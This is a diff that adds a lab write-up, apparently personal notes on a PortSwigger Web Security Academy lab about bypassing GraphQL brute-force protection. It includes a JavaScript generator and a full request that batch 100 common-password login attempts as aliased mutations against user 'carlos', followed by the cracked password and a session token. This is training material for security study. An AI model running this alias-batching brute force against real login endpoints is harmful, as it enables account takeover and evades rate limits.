@@ -1749,7 +1749,141 @@ so it require the **``id``**
 
 
 
+<details>
+  <summary>Lab: Bypassing GraphQL brute force protections</summary>
 
+
+- <details>
+     <summary>Tip</summary>
+  
+  <img width="1086" height="471" alt="image" src="https://github.com/user-attachments/assets/9aaf76d7-99e0-47c5-995f-90ddd91d2908" />
+  
+  ```javascript
+  
+  copy(`123456,password,12345678,qwerty,123456789,12345,1234,111111,1234567,dragon,123123,baseball,abc123,football,monkey,letmein,shadow,master,666666,qwertyuiop,123321,mustang,1234567890,michael,654321,superman,1qaz2wsx,7777777,121212,000000,qazwsx,123qwe,killer,trustno1,jordan,jennifer,zxcvbnm,asdfgh,hunter,buster,soccer,harley,batman,andrew,tigger,sunshine,iloveyou,2000,charlie,robert,thomas,hockey,ranger,daniel,starwars,klaster,112233,george,computer,michelle,jessica,pepper,1111,zxcvbn,555555,11111111,131313,freedom,777777,pass,maggie,159753,aaaaaa,ginger,princess,joshua,cheese,amanda,summer,love,ashley,nicole,chelsea,biteme,matthew,access,yankees,987654321,dallas,austin,thunder,taylor,matrix,mobilemail,mom,monitor,monitoring,montana,moon,moscow`.split(',').map((element,index)=>`
+  bruteforce$index:login(input:{password: "$password", username: "carlos"}) {
+          token
+          success
+      }
+  `.replaceAll('$index',index).replaceAll('$password',element)).join('\n'));console.log("The query has been copied to your clipboard.");
+  ```
+  
+  <img width="1314" height="725" alt="image" src="https://github.com/user-attachments/assets/fa809ec6-fc31-4f69-ab17-59c287b0afbd" />
+  
+
+-----
+
+### change it form this :
+
+<img width="1439" height="783" alt="image" src="https://github.com/user-attachments/assets/5299c3b2-8225-4368-9faa-e31770bd3fdb" />
+
+```graphql
+mutation login($input: LoginInput!) {
+        login(input: $input) {
+            token
+            success
+        }
+    }
+```
+
+### to this
+
+
+
+```graphql
+mutation  {
+        
+    }
+```
+
+### and inside it put the output of the js script
+
+
+```json
+
+bruteforce64:login(input:{password: "555555", username: "carlos"}) {
+        token
+        success
+    }
+
+
+bruteforce65:login(input:{password: "11111111", username: "carlos"}) {
+        token
+        success
+    }
+
+
+bruteforce66:login(input:{password: "131313", username: "carlos"}) {
+        token
+        success
+    }
+
+
+
+```
+
+
+### result 
+
+
+```
+mutation login{
+
+bruteforce64:login(input:{password: "555555", username: "carlos"}) {
+        token
+        success
+    }
+
+
+bruteforce65:login(input:{password: "11111111", username: "carlos"}) {
+        token
+        success
+    }
+
+
+bruteforce66:login(input:{password: "131313", username: "carlos"}) {
+        token
+        success
+    }
+
+
+
+}
+```
+
+
+
+
+  </details>
+
+
+```json
+
+{
+    "query": "mutation bruteForce {\n    try1: login(input: {username: \"carlos\", password: \"123456\"}) { token success }\n    try2: login(input: {username: \"carlos\", password: \"password\"}) { token success }\n    try3: login(input: {username: \"carlos\", password: \"12345678\"}) { token success }\n    try4: login(input: {username: \"carlos\", password: \"qwerty\"}) { token success }\n    try5: login(input: {username: \"carlos\", password: \"123456789\"}) { token success }\n    try6: login(input: {username: \"carlos\", password: \"12345\"}) { token success }\n    try7: login(input: {username: \"carlos\", password: \"1234\"}) { token success }\n    try8: login(input: {username: \"carlos\", password: \"111111\"}) { token success }\n    try9: login(input: {username: \"carlos\", password: \"1234567\"}) { token success }\n    try10: login(input: {username: \"carlos\", password: \"dragon\"}) { token success }\n    try11: login(input: {username: \"carlos\", password: \"123123\"}) { token success }\n    try12: login(input: {username: \"carlos\", password: \"baseball\"}) { token success }\n    try13: login(input: {username: \"carlos\", password: \"abc123\"}) { token success }\n    try14: login(input: {username: \"carlos\", password: \"football\"}) { token success }\n    try15: login(input: {username: \"carlos\", password: \"monkey\"}) { token success }\n    try16: login(input: {username: \"carlos\", password: \"letmein\"}) { token success }\n    try17: login(input: {username: \"carlos\", password: \"shadow\"}) { token success }\n    try18: login(input: {username: \"carlos\", password: \"master\"}) { token success }\n    try19: login(input: {username: \"carlos\", password: \"666666\"}) { token success }\n    try20: login(input: {username: \"carlos\", password: \"qwertyuiop\"}) { token success }\n    try21: login(input: {username: \"carlos\", password: \"123321\"}) { token success }\n    try22: login(input: {username: \"carlos\", password: \"mustang\"}) { token success }\n    try23: login(input: {username: \"carlos\", password: \"1234567890\"}) { token success }\n    try24: login(input: {username: \"carlos\", password: \"michael\"}) { token success }\n    try25: login(input: {username: \"carlos\", password: \"654321\"}) { token success }\n    try26: login(input: {username: \"carlos\", password: \"superman\"}) { token success }\n    try27: login(input: {username: \"carlos\", password: \"1qaz2wsx\"}) { token success }\n    try28: login(input: {username: \"carlos\", password: \"7777777\"}) { token success }\n    try29: login(input: {username: \"carlos\", password: \"121212\"}) { token success }\n    try30: login(input: {username: \"carlos\", password: \"000000\"}) { token success }\n    try31: login(input: {username: \"carlos\", password: \"qazwsx\"}) { token success }\n    try32: login(input: {username: \"carlos\", password: \"123qwe\"}) { token success }\n    try33: login(input: {username: \"carlos\", password: \"killer\"}) { token success }\n    try34: login(input: {username: \"carlos\", password: \"trustno1\"}) { token success }\n    try35: login(input: {username: \"carlos\", password: \"jordan\"}) { token success }\n    try36: login(input: {username: \"carlos\", password: \"jennifer\"}) { token success }\n    try37: login(input: {username: \"carlos\", password: \"zxcvbnm\"}) { token success }\n    try38: login(input: {username: \"carlos\", password: \"asdfgh\"}) { token success }\n    try39: login(input: {username: \"carlos\", password: \"hunter\"}) { token success }\n    try40: login(input: {username: \"carlos\", password: \"buster\"}) { token success }\n    try41: login(input: {username: \"carlos\", password: \"soccer\"}) { token success }\n    try42: login(input: {username: \"carlos\", password: \"harley\"}) { token success }\n    try43: login(input: {username: \"carlos\", password: \"batman\"}) { token success }\n    try44: login(input: {username: \"carlos\", password: \"andrew\"}) { token success }\n    try45: login(input: {username: \"carlos\", password: \"tigger\"}) { token success }\n    try46: login(input: {username: \"carlos\", password: \"sunshine\"}) { token success }\n    try47: login(input: {username: \"carlos\", password: \"iloveyou\"}) { token success }\n    try48: login(input: {username: \"carlos\", password: \"2000\"}) { token success }\n    try49: login(input: {username: \"carlos\", password: \"charlie\"}) { token success }\n    try50: login(input: {username: \"carlos\", password: \"robert\"}) { token success }\n    try51: login(input: {username: \"carlos\", password: \"thomas\"}) { token success }\n    try52: login(input: {username: \"carlos\", password: \"hockey\"}) { token success }\n    try53: login(input: {username: \"carlos\", password: \"ranger\"}) { token success }\n    try54: login(input: {username: \"carlos\", password: \"daniel\"}) { token success }\n    try55: login(input: {username: \"carlos\", password: \"starwars\"}) { token success }\n    try56: login(input: {username: \"carlos\", password: \"klaster\"}) { token success }\n    try57: login(input: {username: \"carlos\", password: \"112233\"}) { token success }\n    try58: login(input: {username: \"carlos\", password: \"george\"}) { token success }\n    try59: login(input: {username: \"carlos\", password: \"computer\"}) { token success }\n    try60: login(input: {username: \"carlos\", password: \"michelle\"}) { token success }\n    try61: login(input: {username: \"carlos\", password: \"jessica\"}) { token success }\n    try62: login(input: {username: \"carlos\", password: \"pepper\"}) { token success }\n    try63: login(input: {username: \"carlos\", password: \"1111\"}) { token success }\n    try64: login(input: {username: \"carlos\", password: \"zxcvbn\"}) { token success }\n    try65: login(input: {username: \"carlos\", password: \"555555\"}) { token success }\n    try66: login(input: {username: \"carlos\", password: \"11111111\"}) { token success }\n    try67: login(input: {username: \"carlos\", password: \"131313\"}) { token success }\n    try68: login(input: {username: \"carlos\", password: \"freedom\"}) { token success }\n    try69: login(input: {username: \"carlos\", password: \"777777\"}) { token success }\n    try70: login(input: {username: \"carlos\", password: \"pass\"}) { token success }\n    try71: login(input: {username: \"carlos\", password: \"maggie\"}) { token success }\n    try72: login(input: {username: \"carlos\", password: \"159753\"}) { token success }\n    try73: login(input: {username: \"carlos\", password: \"aaaaaa\"}) { token success }\n    try74: login(input: {username: \"carlos\", password: \"ginger\"}) { token success }\n    try75: login(input: {username: \"carlos\", password: \"princess\"}) { token success }\n    try76: login(input: {username: \"carlos\", password: \"joshua\"}) { token success }\n    try77: login(input: {username: \"carlos\", password: \"cheese\"}) { token success }\n    try78: login(input: {username: \"carlos\", password: \"amanda\"}) { token success }\n    try79: login(input: {username: \"carlos\", password: \"summer\"}) { token success }\n    try80: login(input: {username: \"carlos\", password: \"love\"}) { token success }\n    try81: login(input: {username: \"carlos\", password: \"ashley\"}) { token success }\n    try82: login(input: {username: \"carlos\", password: \"nicole\"}) { token success }\n    try83: login(input: {username: \"carlos\", password: \"chelsea\"}) { token success }\n    try84: login(input: {username: \"carlos\", password: \"biteme\"}) { token success }\n    try85: login(input: {username: \"carlos\", password: \"matthew\"}) { token success }\n    try86: login(input: {username: \"carlos\", password: \"access\"}) { token success }\n    try87: login(input: {username: \"carlos\", password: \"yankees\"}) { token success }\n    try88: login(input: {username: \"carlos\", password: \"987654321\"}) { token success }\n    try89: login(input: {username: \"carlos\", password: \"dallas\"}) { token success }\n    try90: login(input: {username: \"carlos\", password: \"austin\"}) { token success }\n    try91: login(input: {username: \"carlos\", password: \"thunder\"}) { token success }\n    try92: login(input: {username: \"carlos\", password: \"taylor\"}) { token success }\n    try93: login(input: {username: \"carlos\", password: \"matrix\"}) { token success }\n    try94: login(input: {username: \"carlos\", password: \"mobilemail\"}) { token success }\n    try95: login(input: {username: \"carlos\", password: \"mom\"}) { token success }\n    try96: login(input: {username: \"carlos\", password: \"monitor\"}) { token success }\n    try97: login(input: {username: \"carlos\", password: \"monitoring\"}) { token success }\n    try98: login(input: {username: \"carlos\", password: \"montana\"}) { token success }\n    try99: login(input: {username: \"carlos\", password: \"moon\"}) { token success }\n    try100: login(input: {username: \"carlos\", password: \"moscow\"}) { token success }\n}",
+    "operationName": "bruteForce",
+    "variables": {}
+}
+
+```
+
+
+<img width="1436" height="738" alt="image" src="https://github.com/user-attachments/assets/d63785c5-a954-4634-8abc-acce52530286" />
+
+password 
+
+```
+123123
+```
+
+Token
+
+```
+Vuw96J2kIh6BrKRrjlwhb8tQ96AViUTI
+```
+
+  
+</details>
 
 
 
